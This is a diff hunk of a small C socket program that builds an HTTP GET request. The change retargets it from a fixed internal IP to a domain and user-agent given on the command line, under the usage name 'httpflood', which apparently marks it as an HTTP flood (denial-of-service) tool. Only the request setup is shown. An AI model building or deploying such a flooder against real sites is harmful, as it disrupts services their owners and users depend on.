@@ -11,16 +11,16 @@ void error(const char *msg) { perror(msg); exit(0); }
 int main(int argc,char *argv[])
 {
     /* first what are we going to send and where are we going to send it? */
-    int portno =        80;
-    char *host =        "10.0.4.110";
-    char *message_fmt = "GET / HTTP/1.1\nHost:xxx.com\nUser-agent:xxx\r\n\r\n";
+    int portno = 80;
+    char *host = argv[1];
+    char *message_fmt = "GET / HTTP/1.1\nHost:%s\nUser-agent:%s\r\n\r\n";
 
     struct hostent *server;
     struct sockaddr_in serv_addr;
     int sockfd, bytes, sent, received, total;
     char message[1024],response[4096];
 
-    if (argc < 3) { puts("Parameters: <apikey> <command>"); exit(0); }
+    if (argc < 3) { puts("Usage: ./httpflood <domain> <useragent>"); exit(0); }
 
     /* fill in the parameters */
     sprintf(message,message_fmt,argv[1],argv[2]);
